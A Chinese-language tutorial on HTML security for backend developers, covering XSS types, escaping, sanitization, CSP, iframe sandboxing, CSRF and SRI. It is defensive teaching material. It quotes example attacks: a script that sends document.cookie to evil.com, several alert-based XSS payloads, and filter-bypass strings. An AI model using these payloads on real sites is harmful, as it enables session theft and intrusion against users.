# HTML 安全防护

## 核心概念

前端安全的核心战场在 HTML 层——攻击者的目标是向页面注入恶意标签或脚本。后端开发者熟悉 SQL 注入，HTML 层面的等价物就是 **XSS（跨站脚本攻击）**。

**后端类比**：
- XSS ≈ SQL 注入（不可信数据混入可执行代码）
- HTML 转义 ≈ SQL 参数化查询（数据与代码分离）
- CSP ≈ 防火墙规则（白名单控制可执行来源）
- iframe sandbox ≈ 容器沙箱（隔离不可信代码）

## XSS 攻击的三种类型

### 存储型 XSS（Stored XSS）

恶意脚本被**持久化存储**在服务端（数据库、文件），其他用户访问时触发。

```
攻击流程：
1. 攻击者在评论框提交：<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
2. 后端不做处理直接存入数据库
3. 其他用户打开评论页面
4. 浏览器解析并执行恶意脚本
5. 用户 Cookie 被发送到攻击者服务器
```

```html
<!-- 后端直接输出未转义的用户内容 -->
<div class="comment">
  <p>用户评论：<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script></p>
</div>
```

**后端类比**：等价于将用户输入直接拼接到 SQL 语句中。

### 反射型 XSS（Reflected XSS）

恶意脚本在 **URL 参数**中，服务端将参数值直接输出到 HTML 中。

```
攻击 URL：
https://example.com/search?q=<script>alert('XSS')</script>
```

```html
<!-- 服务端直接输出查询参数 -->
<h1>搜索结果：<script>alert('XSS')</script></h1>
```

攻击者通常通过钓鱼邮件或社交平台传播恶意 URL。

### DOM 型 XSS（DOM-based XSS）

恶意脚本**完全在客户端**执行，不经过服务端。

```javascript
// ❌ 直接将 URL 参数插入 DOM
const query = new URLSearchParams(location.search).get('q');
document.getElementById('result').innerHTML = '搜索：' + query;

// 攻击 URL：?q=<img src=x onerror="alert('XSS')">
// innerHTML 会解析 HTML，触发 onerror 事件
```

### 三种 XSS 对比

| 类型 | 恶意代码存储位置 | 触发方式 | 防御责任 |
|------|---------------|---------|---------|
| 存储型 | 服务端数据库 | 访问含恶意数据的页面 | 后端为主 |
| 反射型 | URL 参数 | 点击恶意链接 | 后端为主 |
| DOM 型 | URL / 客户端 | 客户端 JS 处理不当 | 前端为主 |

## HTML 转义

### 基本原理

将 HTML 特殊字符转换为**实体引用**，使其作为文本显示而非被解析为标签：

| 字符 | 实体 | 说明 |
|------|------|------|
| `<` | `&lt;` | 标签开始 |
| `>` | `&gt;` | 标签结束 |
| `&` | `&amp;` | 实体引用前缀 |
| `"` | `&quot;` | 属性值分隔符 |
| `'` | `&#39;` 或 `&apos;` | 属性值分隔符 |

### 后端转义（服务端渲染时）

```javascript
// Node.js 转义函数
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
  };
  return str.replace(/[&<>"']/g, char => escapeMap[char]);
}

// 使用
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHtml(userInput);
// 输出：&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
// 浏览器渲染为纯文本，不执行脚本
```

```java
// Java（Spring 默认开启 HTML 转义）
// Thymeleaf 模板默认转义
// <p th:text="${userInput}"></p>  ← 自动转义

// 手动转义
import org.apache.commons.text.StringEscapeUtils;
String safe = StringEscapeUtils.escapeHtml4(userInput);
```

### 前端安全输出

```javascript
// ❌ innerHTML 直接插入（危险！）
element.innerHTML = userInput;

// ✅ textContent 只插入文本（安全）
element.textContent = userInput;

// ✅ 需要插入 HTML 结构时，用 DOM API 构建
const p = document.createElement('p');
p.textContent = userInput;  // 用户内容作为文本
container.appendChild(p);
```

**核心原则**：`innerHTML` 是 XSS 的主要入口，除非内容完全可信，否则始终使用 `textContent`。

### 上下文敏感转义

不同 HTML 上下文需要不同的转义策略：

```html
<!-- 1. HTML 正文 → HTML 实体转义 -->
<p>用户名：{{ escapeHtml(username) }}</p>

<!-- 2. HTML 属性 → HTML 实体转义 + 必须加引号 -->
<img alt="{{ escapeHtml(altText) }}">
<!-- ❌ 不加引号极其危险 -->
<div class={{ userInput }}>  <!-- 攻击：onmouseover=alert(1) -->

<!-- 3. URL → URL 编码 -->
<a href="/search?q={{ encodeURIComponent(query) }}">搜索</a>

<!-- 4. JavaScript 上下文 → JSON 编码 -->
<script>
  const data = {{ JSON.stringify(serverData) }};
</script>

<!-- 5. CSS 上下文 → CSS 转义（极少使用） -->
<div style="background: {{ cssEscape(color) }}"></div>
```

## 内容消毒（Sanitization）

当需要允许用户输入部分 HTML（如富文本编辑器）时，不能简单转义所有内容，需要**白名单过滤**。

### DOMPurify（推荐库）

```javascript
import DOMPurify from 'dompurify';

// 用户输入的富文本
const dirty = '<p>正常内容</p><script>alert("XSS")</script><img src=x onerror=alert(1)>';

// 消毒后
const clean = DOMPurify.sanitize(dirty);
// 输出：<p>正常内容</p><img src="x">
// script 标签被移除，onerror 属性被移除

// 自定义白名单
const clean2 = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
});
```

### Sanitizer API（浏览器原生，实验性）

```javascript
// 浏览器原生 Sanitizer API（Chrome 105+，尚未广泛支持）
const sanitizer = new Sanitizer({
  allowElements: ['p', 'b', 'i', 'a'],
  allowAttributes: { 'href': ['a'] },
});

element.setHTML(userInput, { sanitizer });
```

## CSP（Content Security Policy）

### 工作原理

CSP 通过 HTTP 响应头告诉浏览器哪些资源来源是可信的，不在白名单内的资源会被阻止加载或执行。

```
后端类比：CSP ≈ 防火墙规则 / API 网关的访问控制列表
```

### 基本配置

```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self' https://fonts.googleapis.com;
  connect-src 'self' https://api.example.com;
  frame-src 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'self';
```

### 指令详解

| 指令 | 控制范围 | 常用值 |
|------|---------|-------|
| `default-src` | 所有资源的默认策略 | `'self'` |
| `script-src` | JavaScript 来源 | `'self'` `'nonce-xxx'` |
| `style-src` | CSS 来源 | `'self'` `'unsafe-inline'` |
| `img-src` | 图片来源 | `'self'` `data:` `https:` |
| `connect-src` | XHR / Fetch / WebSocket | `'self'` API 域名 |
| `frame-src` | iframe 来源 | `'none'` |
| `object-src` | Flash / Java Applet | `'none'`（必须禁止） |
| `base-uri` | `<base>` 标签的 href | `'self'` |
| `form-action` | 表单提交目标 | `'self'` |

### 使用 nonce 替代 unsafe-inline

```http
Content-Security-Policy: script-src 'nonce-abc123def456'
```

```html
<!-- ✅ 服务端生成的脚本带有 nonce，可以执行 -->
<script nonce="abc123def456">
  console.log('可信脚本');
</script>

<!-- ❌ 注入的脚本没有 nonce，被 CSP 阻止 -->
<script>alert('XSS')</script>

<!-- ❌ 内联事件处理也被阻止 -->
<button onclick="alert('XSS')">点击</button>
```

**每次请求**必须生成新的随机 nonce，不能复用。

```javascript
// Express 中间件示例
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  res.setHeader('Content-Security-Policy', 
    `script-src 'nonce-${nonce}'; object-src 'none'; base-uri 'self';`
  );
  next();
});
```

### Meta 标签配置 CSP

```html
<!-- 无法通过 HTTP 头设置时的备选方案 -->
<meta http-equiv="Content-Security-Policy" 
  content="default-src 'self'; script-src 'self'; object-src 'none';">
```

**限制**：meta 标签的 CSP 不支持 `frame-ancestors` 和 `report-uri` 指令。

### CSP 报告模式

```http
# 仅报告，不阻止（用于调试和渐进部署）
Content-Security-Policy-Report-Only: 
  default-src 'self';
  report-uri /api/csp-report;
```

后端接收 CSP 违规报告，分析后再正式启用。

## iframe 安全

### sandbox 属性

```html
<!-- 完全沙箱化：禁止所有能力 -->
<iframe src="https://untrusted.com" sandbox></iframe>

<!-- 选择性开放能力 -->
<iframe src="https://trusted-widget.com" sandbox="
  allow-scripts
  allow-same-origin
  allow-forms
  allow-popups
"></iframe>
```

| sandbox 值 | 允许的行为 |
|------------|-----------|
| （空值） | 完全隔离，几乎不能做任何事 |
| `allow-scripts` | 执行 JavaScript |
| `allow-same-origin` | 保持同源策略（否则视为独立源） |
| `allow-forms` | 提交表单 |
| `allow-popups` | 弹出新窗口 |
| `allow-modals` | 显示 alert / confirm / prompt |
| `allow-top-navigation` | 修改顶层窗口 URL |

**安全原则**：`allow-scripts` 和 `allow-same-origin` 不要同时使用在不可信内容上，否则脚本可以移除 sandbox 属性。

### X-Frame-Options / frame-ancestors

防止页面被嵌入到其他网站的 iframe 中（防点击劫持）：

```http
# 旧方案
X-Frame-Options: DENY                    # 完全禁止被嵌入
X-Frame-Options: SAMEORIGIN              # 只允许同源嵌入

# 新方案（CSP 的 frame-ancestors）
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

## 链接安全

### rel="noopener noreferrer"

```html
<!-- ❌ target="_blank" 的安全隐患 -->
<a href="https://external.com" target="_blank">外部链接</a>
<!-- 新页面可以通过 window.opener 访问原页面的 window 对象 -->

<!-- ✅ 安全写法 -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">
  外部链接
</a>
```

| 属性值 | 作用 |
|--------|------|
| `noopener` | 新页面的 `window.opener` 为 `null`，阻止反向访问 |
| `noreferrer` | 不发送 `Referer` 头，同时隐含 `noopener` |

**注意**：现代浏览器（Chrome 88+）已默认为 `target="_blank"` 添加 `noopener`，但为了兼容性和明确性，仍建议显式声明。

### javascript: 协议防护

```html
<!-- ❌ 危险：用户输入的 URL 可能包含 javascript: -->
<a href="{{ userInput }}">链接</a>
<!-- 攻击：userInput = "javascript:alert('XSS')" -->

<!-- ✅ 校验 URL 协议 -->
```

```javascript
function isSafeUrl(url) {
  try {
    const parsed = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

## 表单安全

### CSRF 防护

```html
<!-- 后端生成隐藏的 CSRF Token -->
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机Token">
  <input type="number" name="amount" required>
  <button type="submit">转账</button>
</form>
```

```javascript
// SPA 中通过 meta 标签传递 Token
// 服务端渲染时注入：
// <meta name="csrf-token" content="随机Token">

const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken,
  },
  body: JSON.stringify({ amount: 100 }),
});
```

**后端类比**：CSRF Token ≈ 幂等键（Idempotency Key），确保请求来自合法来源。

### autocomplete 控制

```html
<!-- 敏感信息禁止自动填充 -->
<input type="text" name="otp" autocomplete="off">
<input type="text" name="captcha" autocomplete="off">

<!-- 正确使用 autocomplete 帮助密码管理器 -->
<input type="password" name="password" autocomplete="current-password">
<input type="password" name="new-password" autocomplete="new-password">
```

## 其他 HTML 安全措施

### Subresource Integrity（SRI）

验证外部资源文件的完整性，防止 CDN 被篡改：

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8w"
  crossorigin="anonymous"
></script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/style.css"
  integrity="sha256-xxx"
  crossorigin="anonymous"
>
```

如果文件内容的哈希值与 `integrity` 声明不匹配，浏览器将拒绝加载。

### Trusted Types（实验性）

从根源上阻止 DOM XSS：

```http
Content-Security-Policy: require-trusted-types-for 'script'
```

```javascript
// 启用 Trusted Types 后，直接赋值 innerHTML 会报错
element.innerHTML = userInput;  // TypeError!

// 必须通过定义的策略创建可信值
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML: (input) => DOMPurify.sanitize(input),
});

element.innerHTML = policy.createHTML(userInput);  // 通过策略过滤
```

### Referrer Policy

控制 `Referer` 头的发送策略：

```html
<meta name="referrer" content="strict-origin-when-cross-origin">
```

| 策略 | 行为 |
|------|------|
| `no-referrer` | 不发送 Referer |
| `origin` | 只发送源（不含路径） |
| `strict-origin-when-cross-origin` | 同源发送完整 URL，跨域只发送源（推荐默认） |

## 安全检查清单

```
□ 所有用户输入都经过 HTML 转义后再输出
□ 前端使用 textContent 而非 innerHTML 插入用户数据
□ 富文本内容通过 DOMPurify 等库消毒
□ 配置 CSP，至少禁止 object-src 和 base-uri
□ 外部链接添加 rel="noopener noreferrer"
□ 用户输入的 URL 验证协议白名单
□ iframe 嵌入不可信内容时使用 sandbox
□ 表单包含 CSRF Token
□ 外部 CDN 资源添加 SRI 校验
□ 配置 X-Frame-Options 或 frame-ancestors 防止点击劫持
□ 敏感 Cookie 设置 HttpOnly、Secure、SameSite
```

## 常见误区

### 误区 1：只在前端做输入验证

```javascript
// ❌ 前端验证可被绕过（直接发 HTTP 请求）
if (input.value.includes('<script>')) {
  alert('非法输入');
}

// ✅ 前端验证是 UX 优化，后端验证才是安全保障
// 前端：即时反馈
// 后端：最终防线
```

### 误区 2：黑名单过滤

```javascript
// ❌ 黑名单永远不完整
function sanitize(input) {
  return input.replace(/<script>/g, '');
}
// 绕过：<scr<script>ipt>  →  过滤后变成 <script>
// 绕过：<SCRIPT>  →  大小写绕过
// 绕过：<img onerror=alert(1)>  →  不在黑名单中

// ✅ 白名单 + 成熟库
DOMPurify.sanitize(input, { ALLOWED_TAGS: ['p', 'b', 'i'] });
```

### 误区 3：只转义 < 和 >

```html
<!-- ❌ 只转义尖括号，属性上下文仍可攻击 -->
<input value="{{ partialEscape(userInput) }}">
<!-- 攻击：userInput = '" onmouseover="alert(1)' -->
<!-- 渲染：<input value="" onmouseover="alert(1)"> -->

<!-- ✅ 必须转义全部 5 个特殊字符，并且属性值必须加引号 -->
```

## 参考资源

- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [MDN - Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN - `<iframe>` sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Web.dev - Trusted Types](https://web.dev/trusted-types/)
- [OWASP - CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
